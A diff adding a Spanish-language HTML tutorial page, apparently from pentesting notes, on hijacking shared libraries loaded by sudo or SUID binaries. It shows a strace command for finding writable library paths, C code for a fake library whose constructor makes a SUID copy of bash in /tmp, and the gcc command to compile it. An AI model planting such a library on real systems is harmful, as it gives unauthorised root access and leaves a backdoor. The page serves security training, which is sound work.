@@ -1,0 +1,45 @@
+<h1>Hijacking de librerías</h1>
+
+<p class="mainText">
+    Si nos encontramos con un binario que no es estándar y se puede ejecutar con privilegios altos mediante sudo o está establecido como SUID, 
+    es interesante comprobar dónde está intentando cargar las librerías y asegurarnos de que no tenemos acceso para manipular ninguno de esos directorios.
+</p>
+
+
+<h2><i class="bi bi-check-circle me-2"></i></i>Comprobación</h2>
+<p class="mainText">
+    Una técnica sencilla para saber qué librerías trata de cargar es utilizando el comando strace, que se utiliza para rastrear las llamadas al sistema que 
+    realiza el binario en ejecución. Para reducir la salida, filtraremos por las cadenas donde intenta cargar una librería.
+</p>
+<!-- Code snipet-->
+<div class="snipet_custom position-relative">
+<pre class="code_snipet"><code data-language="shell">strace [binario] 2>&1 | grep -i -E "open|access|no such file"
+</code></pre>
+</div>
+<!-- Code-->
+
+<p class="mainText">
+    Si encontramos una ruta manipulable, podemos colocar una librería falsa con un backdoor bash SUID utilizando, por ejemplo, el siguiente código:
+</p>
+<!-- Code snipet-->
+<div class="snipet_custom position-relative">
+<pre class="code_snipet"><code data-language="shell">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+static void inject() __attribute__((constructor));
+void inject(){
+    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash");
+}
+</code></pre>
+</div>
+<!-- Code-->
+
+
+<p class="mainText">
+    Y para la compilación:
+</p>
+<!-- Code snipet-->
+<div class="snipet_custom position-relative">
+<pre class="code_snipet"><code data-language="shell">gcc -shared -o backdoor.so -fPIC backdoor.c
+</code></pre>
+</div>
+<!-- Code-->
